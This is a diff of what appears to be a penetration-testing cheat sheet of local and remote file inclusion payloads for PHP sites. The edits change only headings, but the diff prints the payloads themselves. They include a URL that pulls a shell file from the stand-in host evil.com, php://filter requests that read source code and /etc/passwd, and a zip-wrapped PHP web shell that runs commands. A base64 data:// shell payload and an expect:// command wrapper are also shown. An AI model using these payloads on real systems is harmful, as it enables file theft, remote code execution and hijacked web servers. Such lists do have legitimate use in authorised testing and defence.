@@ -136,9 +136,10 @@ http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 
 #### [+] LFI / RFI Wrappers :
 
-LFI Wrapper rot13 and base64 - php://filter case insensitive.
+>> LFI Wrapper rot13 and base64 - php://filter case insensitive.
 
 ```
+
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
 http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
 http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
@@ -147,7 +148,7 @@ Can be chained with a compression wrapper.
 http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 ```
 
-#### [+] LFI Wrapper ZIP :
+>> LFI Wrapper ZIP :
 
 ```
 echo "</pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
@@ -158,13 +159,13 @@ rm payload.php
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
 ```
 
-#### [+] RFI Wrapper DATA with "" payload :
+>> RFI Wrapper DATA with "" payload :
 
 ```
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 ```
 
-#### [+] RFI Wrapper EXPECT :
+>> RFI Wrapper EXPECT :
 
 ```
 http://example.com/index.php?page=php:expect://id
